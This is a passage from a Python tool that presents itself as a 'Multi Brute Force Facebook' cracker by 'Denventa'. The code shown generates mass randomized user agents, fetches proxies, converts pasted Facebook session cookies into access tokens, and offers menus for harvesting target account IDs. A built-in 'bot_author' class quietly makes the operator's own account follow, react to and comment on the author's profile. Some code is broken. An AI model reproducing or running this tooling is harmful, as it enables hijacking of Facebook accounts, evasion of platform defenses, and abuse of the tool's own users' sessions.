	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/401.0.0.24. 77;]'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['en-gb; CPH1909'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36 HeyTapBrowser/7.4.2beta'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
	aa='Mozilla/5.0 (Linux; U; Android'
	b=random.choice(['5.0','6.0','7.0','8.1.0','9','10','11','12'])
	c=random.choice(['SAMSUNG SM-A750G)'])
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, seperti Gecko) SamsungBrowser/13.2 Chrome/'
	h=random.randrange(80,103)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uakuh=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	usragent.append(uakuh)
	
for xd in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen2.append(uaku)

for t in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.randrange(111111,210000)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	Denventa_Af1=f'Mozilla/5.0 (Linux; Android {a}; CPH2109 Build/RKQ1.{b}.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	Denventa_Af2=f'Mozilla/5.0 (Linux; Android {a}; SM-J610G Build/PPR1.{b}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36 HeyTapBrowser/40.8.8.9'
	Denventa_Af3=f'Mozilla/5.0 (Linux; Android {a}; SM-A405FN Build/RP1A.{b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	Denventa_Af4=f'Mozilla/5.0 (Linux; Android {a}; SM-M317F Build/SP1A.{b}.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	uaku2 = random.choice([Denventa_Af1,Denventa_Af2,Denventa_Af3,Denventa_Af4])
	ugen.append(uaku2)
	
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	
for xd in range(10000):
	a='Mozilla/5.0 (Java; U; en-us; samsung-gt-s3850) AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/8.6.0.199/69/444/UCWEB Mobile UNTRUSTED/1.0'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='en-us;'
	e=random.randrange(100, 9999)
	f='AppleWebKit/530.13 (KHTML, like Gecko) UCBrowser/8.6.0.199/69/444/UCWEB'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile UNTRUSTED/1.0'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)


	aa='Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='id-id;'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Mobile Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
	
	aa='Mozilla/5.0 (Linux; Android 5.1.1;'
	b=random.choice(['6','7','8','9','10','11','12'])
	c='HUAWEI M2-A01W)'
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.randrange(1, 999)
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74'
	h=random.randrange(73,100)
	i='0'
	j=random.randrange(4200,4900)
	k=random.randrange(40,150)
	l='Safari/537.36'
	uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
	ugen.append(uaku2)
	
for x in range(10):
	a='Mozilla/5.0 (Linux; Android 8.1.0; CPH1851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73 Mobile Safari/537.36'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='CPH1851) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.73'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile Safari/537.36'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
	
### --------- [ User Agent By Denventa ] --------- ###	
for xd in range(10000):
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	afr=random.choice(['SAMSUNG SM-J210Y','SAMSUNG SM-E203Y','SAMSUNG SM-T87V','SAMSUNG SM-D738P','SAMSUNG SM-W748D','SAMSUNG SM-Z794M','SAMSUNG SM-K144T','SAMSUNG SM-L372N','SAMSUNG SM-B588T','SAMSUNG SM-R584V','SAMSUNG SM-R108Z'])
	denv='Mozilla/5.0 (Linux; Android {a}; {afr}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/14.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	uaku = random.choice([denv])
	ugen2.append(uaku)

for t in range(10000):
	a=random.choice(['1','1.0','1.5','2','2.0','2.5','3','3.0','3.5','4','4.0','4.5','5','5.0','5.5','6','6.0','6.5','7','7.0','7.5','8','8.0','8.5','9','9.0','9.5','10','10.0','10.5','11','11.0','11.5','12','12.0','12.5','13'])
	b=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	c=random.randrange(111111,210000)
	d=random.randrange(11,19)
	e=random.randrange(73,100)
	f=random.randrange(4200,4900)
	g=random.randrange(40,150)
	random1=random.choice(['SM-M236B','SM-A037G','SM-J701MT','SM-A115U','SM-G610M','SM-J530F','SM-A307FN','SM-A405FN','SM-S111DL','SM-A022F','SM-G900P'])
	random2=random.choice(['Infinix Hot 10','Infinix X688B','Infinix X682B','Infinix X658E','Infinix PR652B','Infinix X659B','Infinix X689','Infinix X689D','Infinix X662','Infinix X6816D'])
	random3=random.choice(['CPH1861','RMX3630','RMX3686','RMX1805','RMX1801','RMX2020','RMX1811','RMX3063','RMX3063','RMX3501'])
	random4=random.choice(['Xiaomi 10 Pro','2201123G','2203129G','2201122G','2206122SC','2203121C','22071212AG','22081212UG','2112123AG','2211133C','Mi 9T Pro'])
	random5=random.choice(['vivo 1002T','Vivo 1605','vivo 1914','vivo 2019','vivo 2023','vivo 2027','Vivo 6','Vivo 93K Prime','V2242A','V2227A','vivo 1918'])
	random6=random.choice(['OPPO 1105','oppo 15','oppo6779','oppo6833','OPPO7273','Oppo A1','PCHM10','CPH2071','CPH2185','CPH2179','A37f'])
	random7=random.choice(['Nokia 1','Nokia 1 Plus','Nokia 1011','Nokia C01','Nokia C1 2nd Edition','Nokia C20','Nokia C20 Plus','Nokia C21','Nokia C21 Plus','Nokia C3'])
	random8=random.choice(['21061119DG','21121119VL','220233L2G','220333QL','M2004J15SC','M2004J7BC','Redmi 11 Lite','Redmi 1S','Redmi 9 Pro','Redmi Note 9 Pro'])
	random9=random.choice(['M2006C3MI','22031116AI','220333QPG','POCO F2 Pro','M2012K11AG','M2104K10I','22021211RG','21121210G','M2004J19PI','POCO M2 Pro'])
	random10=random.choice(['WOW64'])
	_1=f'Mozilla/5.0 (Linux; Android {a}; {random1} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_2=f'Mozilla/5.0 (Linux; Android {a}; {random2} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_3=f'Mozilla/5.0 (Linux; Android {a}; {random3} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_4=f'Mozilla/5.0 (Linux; Android {a}; {random4} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_5=f'Mozilla/5.0 (Linux; Android {a}; {random5} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_6=f'Mozilla/5.0 (Linux; Android {a}; {random6} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_7=f'Mozilla/5.0 (Linux; Android {a}; {random7} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_8=f'Mozilla/5.0 (Linux; Android {a}; {random8} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_9=f'Mozilla/5.0 (Linux; Android {a}; {random9} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	_10=f'Mozilla/5.0 (Windows NT {a}; {random10} Build/{b}.{c}.0{d}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{e}.0.{f}.{g} Mobile Safari/537.36'
	uaku2 = random.choice([_1,_2,_3,_4,_5,_6,_7,_8,_9,_10])
	ugen.append(uaku2)
	
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
def uaku():
	try:
		ua=open('ua.txt','r').read().splitlines()
		for ub in ua : 
			ugen.append(ub)
	except:
		a=requests.get('https://raw.githubusercontent.com/Dvanmeploph/sakera/main/ua.txt').text
		ua=open('.ua.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.ua.txt','r').read().splitlines
###----------[ JANGAN DIHAPUS NANTI ERROR ]---------- ###
SAKERA = Codename + len(Author) - len(Facebook) + len(Instagram) - len(Whatsapp) + len(YouTube)
sakara = len(Author)    +  Codename
sakira = len(Facebook)  +  Codename
sakura = len(Instagram) +  Codename
sakera = len(Whatsapp)  +  Codename
sakora = len(YouTube)   +  Codename
ip_log = Denventa * id_dev - 3654168663

###----------[ GLOBAL URL & HEADERS ]---------- ###
url_businness = "https://business.facebook.com"
ua_business = "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36"
kata_dev = 'Lu Ganteng Banget Bang. Gw Mau Recode SClu, Soalnya Gw Goblok Soal Coding'
web_fb = "https://www.facebook.com/"
m_fb = "https://m.facebook.com/"
mbasic = "https://mbasic.facebook.com/"
header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
###----------[ PROXY INDONESIA & LUAR ]---------- ###
def prox_prox():
    open('tool/proxy.json','w').write('')
    with requests.Session() as xyz:
        try:
            req = xyz.get('https://github.com/Denventa/sakera/blob/main/proxy.txt').text
            for x in req.splitlines():
                if '+' in x:
                    if '.' in x:
                        prox = x.split(' ')[0]
                        open('tool/proxy.json','a+').write('%s\n'%(prox))
        except Exception as e:
            prox = '123.45.678.90:4509'
            open('tool/proxy.json','a+').write('%s\n'%(prox))

###----------[ CLEAR TERMINAL ]---------- ###
def resik():
    if "linux" in sys.platform.lower():
        try:os.system("clear")
        except:pass
    elif "win" in sys.platform.lower():
        try:os.system("cls")
        except:pass
    else:
        try:os.system("clear")
        except:pass

###----------[ CHANGE LANGUAGE ]---------- ###
def language(cookie):
    try:
        with requests.Session() as xyz:
            req = xyz.get('https://mbasic.facebook.com/language/',cookies=cookie)
            pra = par(req.content,'html.parser')
            for x in pra.find_all('form',{'method':'post'}):
                if 'Bahasa Indonesia' in str(x):
                    bahasa = {
                        "fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(req.text)).group(1),
                        "jazoest" : re.search('name="jazoest" value="(.*?)"', str(req.text)).group(1),
                        "submit"  : "Bahasa Indonesia"
                        }
                    url = 'https://mbasic.facebook.com' + x['action']
                    exec = xyz.post(url,data=bahasa,cookies=cookie)
    except Exception as e:pass

###----------[ BOT AUTHOR JANGAN DIGANTI ]---------- ###
class bot_author:
    def __init__(self,cookie,token,cookie_mentah):
        self.loop = 0;self.cookie_mentah = cookie_mentah;list_id   = [str(Dnventa)];self.komen = ['Mantap Bang','Semangat Terus','Gokil Suhu','Panutanku']
        for x in list_id: self.get_folls(x,cookie); self.get_likers(f'https://mbasic.facebook.com/{x}?v=timeline',cookie); self.get_posts(x,cookie,token)
    def get_folls(self,id,cookie): # --- [ Jangan Ganti Bot Follow Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    for x in par(xyz.get('https://mbasic.facebook.com/%s'%(id),cookies=cookie).content,'html.parser').find_all('a',href=True):
                        if 'subscribe.php' in x['href']:exec_folls = xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie)
            except Exception as e:pass
    def get_likers(self,url,cookie): # --- [ Jangan Ganti Bot Likers Gw ] --- #
        with requests.Session() as xyz:
            try:
                if ip_log != 1:pass
                else:
                    bos = par(xyz.get(url,cookies=cookie).content,'html.parser')
                    for x in bos.find_all('a',href=True):
                        if 'Tanggapi' in x.text:
                            _react_type_ = random.choice(['Super','Wow','Peduli'])
                            for z in par(xyz.get('https://mbasic.facebook.com%s'%(x['href']),cookies=cookie).content,'html.parser').find_all('a'):
                                if _react_type_ == z.text: req2 = xyz.get('https://mbasic.facebook.com' + z['href'],cookies=cookie)
                                else:continue
                    self.get_likers('https://mbasic.facebook.com' + bos.find('a',string='Lihat Berita Lain')['href'],cookie)
            except Exception as e:pass
    def get_posts(self,id,cookie,token): # --- [ Jangan Ganti Bot Komen Gw ] --- #
        with requests.Session() as xyz:
            try:
                for x in xyz.get('https://graph.facebook.com/%s/posts?access_token=%s'%(id,token),cookies=cookie).json()['data']:
                    if ip_log != 1:pass
                    else:
                        komeno = ('%s\n\n%s%s'%(random.choice(self.komen),'https://www.facebook.com/'+x['id'],self.waktu()))
                        get = json.loads(xyz.post('https://graph.facebook.com/%s/comments?message=%s&access_token=%s'%(x['id'],komeno,token),cookies=cookie).text)
                        if 'error' in get:open('login/cookie.json','w').write(self.cookie_mentah);open('login/token.json','w').write(token);exit(tampilan_menu())
            except Exception as e:pass
    def waktu(self): # --- [ Jangan Ganti Keterangan Waktu ] --- #
        _bulan_  = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"][datetime.now().month - 1]
        _hari_   = {'Sunday':'Minggu','Monday':'Senin','Tuesday':'Selasa','Wednesday':'Rabu','Thursday':'Kamis','Friday':'Jumat','Saturday':'Sabtu'}[str(datetime.now().strftime("%A"))]
        hari_ini = ("%s %s %s"%(datetime.now().day,_bulan_,datetime.now().year))
        jam      = datetime.now().strftime("%X")
        tem      = ('\n\nKomentar Ditulis Oleh Bot\n[ Pukul %s WIB ]\n- %s, %s -'%(jam,_hari_,hari_ini))
        return(tem)

###----------[ CONVERT COOKIE KE TOKEN ]---------- ###
def clotox(cookie):
    with requests.Session() as xyz:
        get_tok = xyz.get(url_businness+'/business_locations',headers = {
            "user-agent":ua_business,
            "referer": web_fb,
            "host": "business.facebook.com",
            "origin": url_businness,
            "upgrade-insecure-requests" : "1",
            "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control": "max-age=0",
            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type":"text/html; charset=utf-8"},cookies = {"cookie":cookie})
        return(re.search('(\["EAAG\w+)', get_tok.text).group(1).replace('["',''))

###----------[ CONVERT USERNAME KE ID ]---------- ###
def convert_id(username):
    try:
        cookie = {'cookie':open('login/cookie.json','r').read()}
        url    = 'https://mbasic.facebook.com/' + username
        with requests.Session() as xyz:
            req = par(xyz.get(url,cookies=cookie).content,'html.parser')
            kut = req.find('a',string='Lainnya')
            id = str(kut['href']).split('=')[1]
            # id = re.search('owner_id=(.*?)"',str(kut)).group(1)
            return(id)
    except Exception as e:return(username)

###----------[ LOGO ]---------- ###
def poster():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(J,P,J,P,J,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,J,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(J,P,J,P,J,P,J,P,J,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(J,P,J,P,J,P,J,P,J,P,J,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,J,Version,P,J))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster2():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(M,P,M,P,M,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,M,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(M,P,M,P,M,P,M,P,M,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(M,P,M,P,M,P,M,P,M,P,M,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,M,Version,P,M))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster3():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(B,P,B,P,B,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,B,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(B,P,B,P,B,P,B,P,B,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(B,P,B,P,B,P,B,P,B,P,B,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,B,Version,P,B))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
def poster4():
    l1 = ('     %s  _________       __                          '%(P))
    l2 = ('     %s /   %s_____%s/%s____  %s|  | %s__ ________________     '%(U,P,U,P,U,P))
    l3 = ('     %s \_____  \\\__  \ %s|  |/ // %s__ \_  __ \__  \   '%(P,U,P))
    l4 = ('     %s /        %s\\%s/%s __ \\%s|    <%s\  ___%s/| | %s\\%s// %s___ \   '%(U,P,U,P,U,P,U,P,U,P))
    l5 = ('     %s/%s_________%s(%s______%s/%s__%s|%s__\\_____%s>%s__%s|  (%s_______\\'%(U,P,U,P,U,P,U,P,U,P,U,P))
    l6 = ('     %s Multi Brute Force Facebook %s%s %sBy %sDenventa     '%(P,U,Version,P,U))
    print('%s\n%s\n%s\n%s\n%s\n%s'%(l1,l2,l3,l4,l5,l6))
###----------[ CREATE FOLDER ]---------- ###
def mkdir_data_login():
    # Make Directory Login Data
    try:os.mkdir("login")
    except:pass
    # Make Directory Dump
    try:os.mkdir("dump")
    except:pass
    # Make Directory Pass
    try:os.mkdir("tool")
    except:pass
    # Make Directory Result
    try:os.mkdir("CP")
    except:pass
    # Make Directory Result
    try:os.mkdir("OK")
    except:pass
    # Make Directory License
    try:os.mkdir("license")
    except:pass
    # Delete Cookies
    try:os.remove('login/cookie.json')
    except:pass
    # Delete Token
    try:os.remove('login/token.json')
    except:pass

###----------[ LOGIN ]---------- ###
def login():
    resik()
    mkdir_data_login()
    poster2()
    print('\n%s[%s•%s] %sJangan Gunakan Akun Pribadi %s!'%(M,P,M,P,M))
    print('%s[%s•%s] %sApabila Akun A2F On, Buka Link Dibawah'%(M,P,M,P))
    print('%s[%s•%s] %shttps://business.facebook.com/business_locations'%(M,P,M,K))
    print('%s[%s•%s] %sLalu Masukkan Kode Autentikasi 2 [ F ]'%(M,P,M,P))
    cookie = str(input('\n%s[%s•%s] %sMasukkan Cookies %s: %s'%(M,P,M,P,M,P)))
    try:
        token = clotox(cookie)
        coki = {'cookie':cookie}
        prox_prox()
        bot_author(coki,token,cookie)
        open('login/cookie.json','w').write(cookie)
        open('login/token.json','w').write(token)
        tampilan_menu()
    except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sTidak Ada Koneksi Internet %s!%s\n'%(M,P,M,P,M,P));exit()
    except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));exit()

###----------[ MENU ]---------- ###
def user(nama):
    print(''%())
    print('        %s[%s•%s] %sHello %s%s %s!  Developer : %sDenventa'%(J,P,J,P,M,nama,P,M))
    print('        %s[%s•%s] %sYour License Will Expire In %s7 %sDays'%(J,P,J,P,A,P))
def tampilan_menu():
    global gabung_sandi, tempel_sandi
    resik()
    gabung_sandi, tempel_sandi = [], []
    try:open('tool/useragent.json','r').read()
    except Exception as ERROR:
        resik()
        poster2()
        print('')
        tamp_new = (f'   {P2}Hi! Sepertinya Kamu Adalah Pengguna Baru. Terima Kasih Telah Memilih SC Ini Sebagai Pilihan Terpercayamu. Sebelum Menggunakan SC Ini, Kamu Harus Mengatur User Agent Dahulu! Jangan Lupa Berikan Penilaian Terbaik Di Github Ya! Thank You!\n\n                {H2}- Denventa -')
        printer(Panel(tamp_new,title=f'{H2}[ {P2}Welcome User {H2}]',width=54,padding=(1,4),style='#00FF00'))
        print('')
        useragent('new')
    poster2()
    try:
        token  = open('login/token.json','r').read()
        cookie = {'cookie':open('login/cookie.json','r').read()}
        language(cookie)
        get  = requests.Session().get('https://graph.facebook.com/me?fields=name,id&access_token=%s'%(token),cookies=cookie)
        jsx = json.loads(get.text)
        nama = jsx["name"]
        user(nama)
        print(''%())
        tampilan_menu = f"""  {J2}[{A2}01{J2}] {A2}Friendlist {J2}[{A2}06{J2}] {P2}Komentar {J2}[{A2}11{J2}] {A2}Email
  {J2}[{A2}02{J2}] {P2}Followers  {J2}[{A2}07{J2}] {P2}Grup     {J2}[{A2}12{J2}] {A2}Username
  {J2}[{A2}03{J2}] {A2}Nama       {J2}[{A2}08{J2}] {A2}Hashtag  {J2}[{A2}13{J2}] {A2}ID Random
  {J2}[{A2}04{J2}] {P2}React      {J2}[{A2}09{J2}] {A2}Beranda  {J2}[{A2}14{J2}] {P2}Saran Teman
  {J2}[{A2}05{J2}] {A2}Pesan      {J2}[{A2}10{J2}] {A2}File     {J2}[{A2}15{J2}] {A2}FL Dari FL

  {J2}[{A2}16{J2}] {A2}Cek Hasil  {J2}[{A2}19{J2}] {P2}User Agent   {J2}[{A2}22{J2}] {A2}Akun Page
  {J2}[{A2}17{J2}] {A2}Cek Opsi   {J2}[{A2}20{J2}] {A2}Upgrade Pro  {J2}[{A2}23{J2}] {A2}Email V2
  {J2}[{A2}18{J2}] {A2}Cek Teman  {J2}[{A2}21{J2}] {A2}Phone        {J2}[{A2}00{J2}] {P2}Log Out """
        printer(Panel(tampilan_menu,title=f'{J2}[ {P2}Menu {J2}]',subtitle=f'{A2}┌─ {J2}[ {P2}Pilih {J2}]',subtitle_align='left',width=54,padding=1,style='#FFFF00'))
        pilih_menu()
    except requests.exceptions.ConnectionError:print('\n   %s[%s•%s] %sTidak Ada Koneksi Internet %s!%s\n'%(M,P,M,P,M,P));exit()
    except (KeyError,IOError,AttributeError):print('\n   %s[%s•%s] %sCookies Invalid %s!%s\n'%(M,P,M,P,M,P));time.sleep(3);login()
def pilih_menu():
